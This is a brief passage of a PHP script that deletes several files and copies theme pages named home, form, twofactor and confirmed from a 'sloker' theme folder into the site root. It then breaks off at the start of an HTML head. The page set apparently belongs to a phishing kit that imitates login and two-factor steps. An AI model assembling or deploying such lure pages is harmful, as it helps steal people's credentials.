...
unlink($DeleteFıles4);
unlink($DeleteFıles5);
copy("../../app/theme/sloker/home.php","../../home.php");
copy("../../app/theme/sloker/form.php","../../form.php");
copy("../../app/theme/sloker/twofactor.php","../../twofactor.php");
copy("../../app/theme/sloker/confirmed.php","../../confirmed.php");
?>
<!DOCTYPE html>
<html lang="en" >
<head>
